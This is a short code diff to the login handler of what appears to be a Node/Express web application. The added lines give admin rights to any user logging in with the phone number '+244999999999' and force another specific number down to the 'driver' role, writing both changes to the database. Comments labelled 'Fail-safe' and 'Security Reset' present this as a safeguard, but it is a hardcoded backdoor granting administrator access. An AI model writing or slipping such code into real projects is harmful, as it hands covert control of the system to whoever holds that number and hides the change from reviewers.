@@ -65,6 +65,19 @@ router.post("/login", async (req, res) => {
     res.status(401).json({ error: "Utilizador inativo" });
     return;
   }
+
+  // Fail-safe: Ensure 999999999 is always Admin on login
+  if (phone === "+244999999999" && user.role !== "admin") {
+    await db.update(usersTable).set({ role: "admin" }).where(eq(usersTable.id, user.id));
+    user.role = "admin";
+  }
+  
+  // Security Reset: Ensure the user's phone mentioned is NOT an admin
+  if (phone === "+244943412688" && user.role !== "driver") {
+    await db.update(usersTable).set({ role: "driver" }).where(eq(usersTable.id, user.id));
+    user.role = "driver";
+  }
+
   (req.session as any).userId = user.id;
   res.json({
     user: {
